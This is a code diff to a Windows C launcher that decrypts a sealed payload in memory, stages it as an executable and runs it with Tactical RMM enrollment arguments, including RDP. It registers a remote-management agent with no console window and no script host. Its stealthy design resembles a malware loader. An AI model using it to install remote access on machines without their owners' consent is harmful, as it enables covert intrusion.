@@ -6,9 +6,15 @@
  *      envelope / config / payload strictly in memory (crypto byte-identical
  *      to template.cs and Node/OpenSSL),
  *   2. stage the decoded agent as <outDir>\_stg_<TAG>.exe,
- *   3. silently install it (/VERYSILENT /SUPPRESSMSGBOXES),
- *   4. run the `enroll` value (tacticalrmm.exe -m install --api … --auth …)
- *      via CreateProcess so the device registers with zero manual steps.
+ *   3. wait ~6s for the agent to settle, then run the STAGED payload itself
+ *      with the full enrollment argv (-m install --api … --client-id …
+ *      --site-id … --agent-type … --auth … --rdp --ping --power) via
+ *      CreateProcess so the device registers with zero manual steps.
+ *
+ * NOTE: there is NO /VERYSILENT run and NO dependence on the fixed
+ * C:\Program Files\TacticalAgent\tacticalrmm.exe path. The payload staged here
+ * is the raw agent transport binary (not an Inno installer); running it
+ * directly with the enrollment argv is what installs AND enrolls it.
  *
  * Compiled with -mwindows (PE Subsystem 2) => no console window is ever
  * attached; no PowerShell, no script host, no shell. The auth token and
@@ -104,9 +110,13 @@ int main(int argc, char **argv) {
                 sprintf(line, "LAUNCHER-STAGE-OK tag=%s size=%zu", SEAL_TAG_32, ov.payload_len);
                 write_marker(outDir, line);
             }
-            const char *silent[] = { "/VERYSILENT", "/SUPPRESSMSGBOXES" };
-            run_proc(full, silent, 2);
-            run_enroll(enroll);
+            /* Wait ~6s for the staged agent to settle, then run the STAGED
+             * payload with the full enrollment argv directly. The staged agent
+             * is the raw transport binary (not an Inno installer), so it
+             * installs AND enrolls in one run — no /VERYSILENT, no fixed
+             * C:\Program Files\TacticalAgent\ path. */
+            sleep_ms(6000);
+            run_enroll_staged(enroll, full);
         }
         free(full);
         free(staged);
